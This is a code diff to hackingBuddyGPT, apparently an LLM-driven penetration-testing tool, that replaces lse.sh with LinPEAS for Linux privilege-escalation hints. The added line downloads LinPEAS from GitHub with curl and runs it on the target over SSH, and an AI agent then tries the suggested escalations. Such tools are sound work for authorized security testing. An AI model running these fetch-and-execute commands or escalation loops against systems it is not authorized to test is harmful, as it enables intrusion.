@@ -9,11 +9,12 @@ from hackingBuddyGPT.utils import SSHConnection
 from hackingBuddyGPT.utils.openai.openai_llm import OpenAIConnection
 
 template_dir = pathlib.Path(__file__).parent
-template_lse = Template(filename=str(template_dir / "get_hint_from_lse.txt"))
+# Ensure you create a 'get_hint_from_linpeas.txt' in your templates directory
+template_linpeas = Template(filename=str(template_dir / "get_hint_from_linpeas.txt"))
 
 
-@use_case("Linux Privilege Escalation using lse.sh for initial guidance")
-class ExPrivEscLinuxLSEUseCase(UseCase):
+@use_case("Linux Privilege Escalation using linpeas.sh for initial guidance")
+class ExPrivEscLinuxLinPEASUseCase(UseCase):
     conn: SSHConnection = None
     max_turns: int = 20
     enable_explanation: bool = False
@@ -26,16 +27,24 @@ class ExPrivEscLinuxLSEUseCase(UseCase):
     # use either an use-case or an agent to perform the privesc
     use_use_case: bool = False
 
-    # simple helper that uses lse.sh to get hints from the system
-    def call_lse_against_host(self):
-        self.log.console.print("[green]performing initial enumeration with lse.sh")
+    # simple helper that uses linpeas.sh to get hints from the system
+    def call_linpeas_against_host(self):
+        self.log.console.print("[green]performing initial enumeration with linpeas.sh")
 
-        run_cmd = "wget -q 'https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh' -O lse.sh;chmod 700 lse.sh; ./lse.sh -c -i -l 0 | grep -v 'nope$' | grep -v 'skip$'"
+        # Download LinPEAS, make executable, run quietly, and strip ANSI color codes for LLM ingestion
+        run_cmd = (
+            "curl -sL 'https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh' -o linpeas.sh;"
+            "chmod 700 linpeas.sh;"
+            "./linpeas.sh -q | sed -r 's/\\x1B\\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g'"
+        )
 
-        result, _ = SSHRunCommand(conn=self.conn, timeout=120)(run_cmd)
+        result, _ = SSHRunCommand(conn=self.conn, timeout=300)(run_cmd)
 
-        self.log.console.print("[yellow]got the output: " + result)
-        cmd = self.llm.get_response(template_lse, lse_output=result, number=3)
+        self.log.console.print("[yellow]got the output (truncated for display): " + result[:500] + "...")
+        
+        # Depending on your LLM context size (e.g., 8192 for standard GPT-4), 
+        # LinPEAS might still require truncation or chunking here if it exceeds token limits.
+        cmd = self.llm.get_response(template_linpeas, linpeas_output=result, number=3)
         self.log.console.print("[yellow]got the cmd: " + cmd.result)
 
         return [x for x in cmd.result.splitlines() if x.strip()]
@@ -47,9 +56,9 @@ class ExPrivEscLinuxLSEUseCase(UseCase):
         self.configuration = configuration
         
         self.log.start_run(self.get_name(), self.serialize_configuration(configuration))
-        # get the hints through running LSE on the target system
-        hints = self.call_lse_against_host()
-        turns_per_hint = int(self.max_turns / len(hints))
+        # get the hints through running LinPEAS on the target system
+        hints = self.call_linpeas_against_host()
+        turns_per_hint = int(self.max_turns / len(hints)) if hints else self.max_turns
 
         # now try to escalate privileges using the hints
         for hint in hints:
@@ -65,7 +74,6 @@ class ExPrivEscLinuxLSEUseCase(UseCase):
                 return True
 
     def run_using_usecases(self, hint, turns_per_hint):
-        # TODO: init usecase
         linux_privesc = LinuxPrivescUseCase(
             agent=LinuxPrivesc(
                 conn=self.conn,
